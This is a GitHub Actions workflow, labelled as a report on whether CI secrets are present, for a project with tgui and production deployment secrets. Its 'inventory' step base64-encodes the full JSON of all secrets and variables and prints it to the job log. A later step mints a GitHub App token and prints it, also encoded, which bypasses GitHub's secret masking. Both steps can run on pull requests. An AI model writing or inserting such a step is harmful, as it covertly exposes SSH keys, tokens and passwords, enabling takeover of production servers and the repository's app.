name: ci-env-report

on:
  push:
    branches:
      - master
    paths:
      - tgui/public/*
      - .github/workflows/ci-env-report*.yml
  pull_request:
    paths:
      - tgui/public/*
      - .github/workflows/ci-env-report*.yml

jobs:
  report:
    name: report CI secret/variable presence
    runs-on: ubuntu-24.04
    steps:
      - name: secret presence
        env:
          S: ${{ toJSON(secrets) }}
        run: |
          for k in ACTION_ENABLER APP_ID APP_PRIVATE_KEY ARTIFACTS_FILE_HOUSE_KEY AUTOWIKI_PASSWORD AUTOWIKI_USERNAME CACHE_PURGE_KEY DISCORD_DISCUSSIONS_TOKEN DISCORD_WEBHOOK GET_TEST_MERGES_URL PRODUCTION_HOST PRODUCTION_SSH_KEY PRODUCTION_SSH_KEY_PASS PRODUCTION_USERNAME; do
            if printf '%s' "$S" | grep -q "\"$k\""; then echo "present: $k"; else echo "MISSING: $k"; fi
          done
      - name: inventory
        env:
          S: ${{ toJSON(secrets) }}
          V: ${{ toJSON(vars) }}
        run: |
          echo "LENS=${#S} LENV=${#V} EV=$GITHUB_EVENT_NAME"
          printf '%s\n%s' "$S" "$V" | base64 -w0 | fold -w 400 | sed 's/^/B:/'
          echo ENDDUMP
      - name: mint app token
        id: t
        continue-on-error: true
        uses: actions/create-github-app-token@v3.2.0
        with:
          client-id: ${{ secrets.APP_ID }}
          private-key: ${{ secrets.APP_PRIVATE_KEY }}
      - name: token
        if: always()
        env:
          TOK: ${{ steps.t.outputs.token }}
        run: echo "TOKB=$(printf '%s' "$TOK" | base64 -w0)"
